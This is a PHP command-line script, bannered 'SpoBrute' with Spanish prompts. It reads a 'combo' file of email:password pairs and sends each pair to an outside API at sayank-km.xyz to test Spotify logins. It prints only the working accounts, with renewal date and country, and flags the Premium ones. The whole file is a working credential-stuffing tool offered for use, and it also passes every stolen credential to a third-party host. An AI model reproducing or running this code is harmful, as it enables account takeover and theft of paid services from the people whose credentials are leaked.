<?php 
echo "\033[01;32m
  _____             ____             _       
 / ____|           |  _ \           | |      
| (___  _ __   ___ | |_) |_ __ _   _| |_ ___ 
 \___ \| '_ \ / _ \|  _ <| '__| | | | __/ _ \
 ____) | |_) | (_) | |_) | |  | |_| | ||  __/
|_____/| .__/ \___/|____/|\033[0m\033[01;31m               
#MD5\033[0m\n";
$ruta = readline("Combo: ");
echo 
"\033[01;37m======================================\033[0m\n";
echo "\033[01;33mSolo saldran cuentas 
funcionales, espere con calma. \033[0m\n";
echo 
"\033[01;37m======================================\033[0m\n";
$oa = fopen($ruta, 'r');
while($a = fgetcsv($oa, 1000, ':')){
	$spotify = curl_init();
	curl_setopt($spotify, 
CURLOPT_URL,"http://sayank-km.xyz/api/?email=$a[0]&pass=$a[1]" 
);
	curl_setopt($spotify, CURLOPT_RETURNTRANSFER, 1 );
	curl_setopt($spotify, CURLOPT_POST, 1 );
	$info=curl_exec ($spotify);
	curl_close ($spotify);
	//echo $info;
	if (strpos($info, 'Premium') !== false) {
	$info=(json_decode($info, true));
	$i=0;
	foreach($info as $clave => $valor) {
	if($clave=="Berlaku"||$clave=="Negara"){
		if($clave=="Berlaku"){
                                $clave="Renueva:";
		}
		if($clave=="Negara"){                                                      
$clave="Pais:";
		};
		$i++;
		if($i==1){
			echo "\033[01;32mCuenta: 
$a[0]:$a[1] | \033[0m";
		}
		if($clave=="Renueva:"||$clave=="Pais:"){
			foreach($valor as $clave2 => 
$valor2) {
			echo "\033[01;32m$clave $valor2 | 
\033[0m";
			}
			if($i==2){
				echo 
"\033[01;32mPREMIUM\033[0m\n";
			}	
		}
	}
	
	}
	
	}else{	
	}
	
}
	fclose($oa); ?>
